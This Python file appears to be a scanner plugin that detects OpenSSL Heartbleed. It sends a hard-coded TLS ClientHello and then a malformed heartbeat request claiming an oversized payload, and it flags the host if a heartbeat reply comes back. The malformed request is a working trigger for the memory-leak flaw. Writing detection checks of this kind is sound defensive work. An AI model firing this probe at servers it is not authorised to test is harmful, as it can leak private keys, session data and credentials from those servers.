#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
import struct


def h2bin(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))


hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')


def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b: b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.') for c in lin)


async def recv_msg(s):
    hdr = await s.read(5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = await s.read(ln)
    if pay is None:
        return None, None, None
    return typ, ver, pay


async def hit_hb(reader, writer):
    writer.write(hb)
    count = 0
    while count < 10:
        count += 1
        typ, ver, pay = await recv_msg(reader)
        if typ is None:
            return False

        if typ == 24:
            hexdump(pay)
            return True

        if typ == 21:
            hexdump(pay)
            return False


async def main(ip, port):
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        writer.write(hello)
        await writer.drain()

        count = 0
        while count < 10:
            count += 1
            typ, ver, pay = await recv_msg(reader)
            if typ is None:
                return
            # Look for server hello done message.
            if typ == 22 and pay[0] == 0x0E:
                break

        writer.write(hb)
        if await hit_hb(reader, writer):
            return True
        else:
            return False
    except Exception as e:
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception as e:
            pass


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if service != 'https' or port > 60000:
        return

    try:
        if await asyncio.wait_for(main(ip, port), 5):
            ret = {
                'alert_group': 'OpenSSL HeartBleed',
                'affects': 'https://%s:%s' % (ip, port),
                'details': 'openssl heartbleed @ https://%s:%s' % (ip, port)
            }
            return ret
    except asyncio.exceptions.TimeoutError:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 8443, 'https', True, task_msg={})
    run_plugin_test(scan)
